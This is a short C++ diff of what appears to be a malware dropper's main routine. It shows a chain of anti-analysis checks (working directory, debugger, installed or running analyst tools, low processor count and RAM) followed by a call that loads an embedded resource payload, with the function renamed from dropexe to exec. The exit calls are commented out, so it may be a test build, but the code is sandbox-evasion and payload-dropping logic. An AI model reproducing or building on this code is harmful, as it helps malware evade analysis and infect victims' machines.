@@ -134,7 +134,7 @@ int dirchk()
 	}
 }
 
-int dropexe()
+int exec()
 {
 	HRSRC hRsc = FindResourceExW(NULL, RT_RCDATA, MAKEINTRESOURCE(101), MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL));
 	if (hRsc == 0)
@@ -195,22 +195,22 @@ int dropexe()
 }
 int main()
 {
-	dropexe();
 	if (dirchk() == 1)
 	{
 		cout << "Exit: Wrong directory!" << endl;
+		//exit();
 	}
-	if (dbgchk()) // return 1 if dbgflag is set, 0 if not
+	else if (dbgchk()) // return 1 if dbgflag is set, 0 if not
 	{
 		cout << "Exit: Debugger detected!" << endl;
 		//exit();
 	}
-	if (appschk())
+	else if (appschk())
 	{
 		cout << "Exit: Analyst tool installed!" << endl;
 		//exit();
 	}
-	if (sysinfo() == 2) // return 2 if low processor count, return 1 low ram 
+	else if (sysinfo() == 2) // return 2 if low processor count, return 1 low ram 
 	{
 		cout << "Exit: Low process count" << endl;
 		//exit();
@@ -219,9 +219,10 @@ int main()
 	{
 		//cout << "Exit: Low RAM" << endl;
 	}
-	if (pschk()) // return 1 if analyst tools is in process listing
+	else if (pschk()) // return 1 if analyst tools is in process listing
 	{
 		cout << "Exit: Analyst tool running!" << endl;
 		//exit();
 	}
+	exec();
 }
